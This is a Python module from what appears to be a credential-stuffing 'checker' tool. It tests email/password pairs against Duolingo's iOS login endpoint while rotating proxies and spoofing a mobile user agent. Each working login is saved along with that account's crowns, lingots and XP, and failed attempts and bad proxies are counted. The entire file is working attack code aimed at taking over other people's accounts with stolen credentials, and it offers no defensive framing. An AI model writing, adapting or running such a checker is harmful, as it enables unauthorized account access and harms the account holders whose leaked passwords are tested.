from modules.variables import Checker
from modules.functions import return_proxy, set_proxy,log,save,bad_proxy
from requests import Session
from json import dumps
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                header = {"Content-Type":"application/json","UserAgent":"DuolingoMobile/6.14.1 (iPhone; iOS 12.0.1; Scale/2.00)"}
                data = dumps({"password":password,"identifier":email,"fields":"currentCourse{trackingProperties},totalXp,trackingProperties,zhTw","distinctId":"EE2C72B5-A05E-42F9-9C09-928DEF7C4BF2"})
                r = s.post("https://ios-api-2.duolingo.com/2017-06-30/login",data=data,headers=header)
                if r.text == "{}":
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "lingots" not in r.text:
                    raise

                data = r.json()
                crowns = data["currentCourse"]["trackingProperties"]["total_crowns"]
                lingots = data["trackingProperties"]["lingots"]
                xp = data["totalXp"]
                
                if not Checker.cui: log("good",':'.join([email,password]),"Duolingo")
                save("Duolingo","good",Checker.time,':'.join([email,password])+f" | Crowns: {crowns} | Lingots: {lingots} | XP: {xp}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            return_proxy(proxy)
            bad_proxy(proxy)
            Checker.errors += 1